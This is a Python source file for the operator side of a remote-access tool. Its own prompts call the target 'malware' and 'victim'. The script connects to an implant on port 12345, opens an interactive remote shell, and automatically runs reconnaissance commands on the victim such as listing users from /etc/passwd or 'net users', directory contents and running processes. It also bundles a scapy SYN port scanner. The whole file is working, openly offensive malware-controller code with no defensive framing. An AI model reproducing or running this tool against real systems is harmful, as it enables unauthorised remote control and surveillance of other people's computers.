from scapy.layers.inet import IP, TCP
from scapy.all import *
import socket
import argparse
from Communication import Communication


class Shell:

    def __init__(self, malware_os, communication):
        self._history = []
        self._command = ""
        self._next_command = True
        self._communication = communication
        self._malware_os = malware_os

    def send(self):
        self._history.append(self._command)
        self._communication.send(self._command)
        # s.send(self._command.encode("utf-8"))

    def receive(self):
        content = self._communication.recv_message_str()
        # if content[2:] == "cd":
        #     self._malware_os.chdir(self._command[3:].decode("utf-8", errors="ignore"))
        print(content)

    def history(self):
        print("The history of your commands is:")
        print("----------------------")
        for element in self._history:
            print(element)

    def close(self):
        self._next_command = False

    def get_command(self):
        return self._command

    def set_command(self, command):
        self._command = command

    def get_next_command(self):
        return self._next_command

    def set_next_command(self, next_command):
        self._next_command = next_command


class GetInfo:
    OS_LIST = ["Windows", "Linux"]

    def __init__(self, malware_os):
        self._os = malware_os

    # List users
    def get_users(self):
        if self._os == self.OS_LIST[0]:
            return "net users"
        elif self._os == self.OS_LIST[1]:
            return "cut -d: -f1 /etc/passwd"

    # list directory content
    def get_content(self):
        if self._os == self.OS_LIST[0]:
            return "dir"
        elif self._os == self.OS_LIST[1]:
            return "ls"

    # list running Process
    def list_process(self):
        if self._os == self.OS_LIST[0]:
            return "tasklist /FI \"STATUS eq running\""
        elif self._os == self.OS_LIST[1]:
            return "ps -A"


class PortScanner:

    def scanner(self):
        address = input("[*] Enter the address to scan: ")
        print("[*] To enter a range give the minimum and maximum port number. To scan a specific port enter twice the "
              "same number.")
        min_port = input("[*] Enter de minimum port number: ")
        max_port = input("[*] Enter the Maximum port Number: ")

        print("[*] Scan started!\n")
        t1 = datetime.now()
        for port in range(int(min_port), int(max_port) + 1):
            resp = sr1(IP(dst=address) / TCP(dport=port, flags="S"), verbose=0)
            if TCP in resp:
                if resp[TCP].flags == "SA":
                    print("Port {}".format(port) + " is open")
        t2 = datetime.now()
        final_time = t2 - t1
        print("\n[*] Scan finished!")

        print("[*] Scanning completed in {}".format(final_time))


def set_up_parser():
    parser = argparse.ArgumentParser()
    parser.add_argument("-a", "--address", type=str, help="Enter the IP address to connect to")
    parser.add_argument("-p", "--portscanner", action="store_true",
                        help="Specify option to only start the port scanner")
    args = parser.parse_args()
    address_option = args.address
    portscanner_ip = args.portscanner
    start_portscanner(portscanner_ip)
    return address_option, portscanner_ip


def get_malware_address(address_option):
    if address_option is None:
        malware_addr = input("[*] Enter the address of the victim: ")
        if not malware_addr:
            print("[!] You must enter an IP!")
            attempts = 1
            while not malware_addr:
                malware_addr = input("[*] Enter the address of the victim: ")
                attempts += 1
                if attempts == 3:
                    print("[!] To many blank attempts. Shutting down program.")
                    sys.exit(0)
    else:
        malware_addr = address_option
    return malware_addr


def start_portscanner(portscanner_ip):
    if not portscanner_ip:
        pass
    else:
        port_scanner = PortScanner()
        port_scanner.scanner()
        sys.exit(0)


def connection(malware_addr):
    serv_addr = (malware_addr, 12345)
    tb = ""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect(serv_addr)
    except socket.error:
        tb = traceback.format_exc()
        print("[!] Unable to connect to the following address: {}".format(malware_addr))
    finally:
        print(tb)

    if tb != "":
        sys.exit(0)

    return s


def run_commands(malware_os, communication):
    getinfo = GetInfo(malware_os)
    shell = Shell(malware_os, communication)
    print("----------------")
    message = input(
        "1. Press 1 to start a Shell\n2. Press 2 to retrieve information of the victim\n3. Press 3 to start a "
        "Port Scanner.\n4. Type shutdown to quit\n\nAnswer: ")
    print("\n----------------------------------------")
    while message != "shutdown":
        if message == "1":
            shell.set_next_command(True)
            while shell.get_next_command():
                shell._command = input("Shell: ")
                while shell.get_command() == "":
                    shell.set_command(input("Shell: "))
                if shell.get_command() == "exit":
                    shell.close()
                elif shell.get_command() == "history":
                    shell.history()
                else:
                    shell.send()
                    shell.receive()
        elif message == "2":
            print("[*] List of Users")
            shell.set_command(getinfo.get_users())
            shell.send()
            shell.receive()
            print("----------------------------------------")
            print("[*] Directory Content")
            shell.set_command(getinfo.get_content())
            shell.send()
            shell.receive()
            print("----------------------------------------")
            print("[*] list Running Process")
            shell.set_command(getinfo.list_process())
            shell.send()
            shell.receive()
            shell.set_command("")
        elif message == "3":
            scan = PortScanner()
            scan.scanner()
        elif message == "shutdown":
            communication.send(message)
            closing_signal = communication.recv_message_str()
            if closing_signal == "ok":
                sys.exit(0)
        print("\n----------------------------------------")
        message = input(
            "1. Press 1 to start a Shell\n2. Press 2 to retrieve information of the victim\n3. Press 3 to start a "
            "Port Scanner.\n4. Type shutdown to quit\n\nAnswer: ")


def main():
    parser_options = set_up_parser()
    malware_addr = get_malware_address(parser_options[0])
    start_portscanner(parser_options[1])
    sock = connection(malware_addr)
    communication = Communication(sock)
    communication.send("os")
    malware_os = communication.recv_message_str()
    run_commands(malware_os, communication)
    sock.close()


if __name__ == "__main__":
    main()
